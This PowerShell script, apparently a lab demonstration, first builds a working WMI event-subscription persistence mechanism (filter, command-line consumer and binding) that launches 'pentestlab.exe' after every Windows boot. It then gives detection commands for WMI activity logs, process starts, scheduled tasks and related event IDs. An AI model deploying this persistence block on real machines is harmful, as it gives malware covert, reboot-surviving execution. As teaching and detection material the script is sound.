<#
    The following script block will execute the arbitrary executable
    “pentestlab.exe” within 5 minutes after every boot of Windows.
#>


<# // FILTER + ARGUMENTS //

    Description: the event filter is a CIM class that describes which
    events CIM delivers to an event consumer. It also describes the conditions
    under which CIM delivers the events. I.E: if the filter conditions are true,
    then the consumer is triggered (the actions to perform).

#>

$FilterArgs = @{name='Pentestlab-WMI';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA `
                'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND `
                TargetInstance.SystemUpTime < 325"};

$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
 
<# // CONSUMER + ARGUMENTS //

    These are the action((s) to perform upon triggering an event

#>


$ConsumerArgs = @{name='Pentestlab-WMI';
                CommandLineTemplate="$($Env:SystemRoot)\System32\pentestlab.exe";}

$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs





 
 <# // BINDING + ARGUMENTS //

    This is the link that ties a filter (event) to a consumer (actions)
 
 #>

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}

$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding `
-Property $FilterToConsumerArgs
#
#
#
#
# Grab WMI Activity logs via PowerShell

$WmiProv = Get-WinEvent -ListProvider "Microsoft-Windows-WMI-Activity"
$WmiProv.Events | Where-Object {$_.LogLink.LogName -eq "Microsoft-Windows-WMI-Activity/Operational"}

# Grab associated Windows Event IDs from the WMI logs

$WmiEvents = $WmiProv.Events | Where-Object {$_.LogLink.LogName -eq "Microsoft-Windows-WMI-Activity/Operational"}
$WmiEvents | Select-Object -Property Id

# Register events generated by a class, and subscribe to the registered events

Register-CimIndicationEvent -ClassName 'Win32_ProcessStartTrace' -SourceIdentifier "ProcessStarted"
Get-Event -SourceIdentifier "ProcessStarted"

# Enumerates non-Microsoft scheduled tasks

Get-ScheduledTask | Where-Object -Property TaskPath -NotLike '\MICROSOFT\*'

# Event 4702 (Task Updated), Events 106 / 4698 (Tasks Created)

Get-EventLog -LogName Security | Where-Object -Property EventID -Match "4702|106|4698"
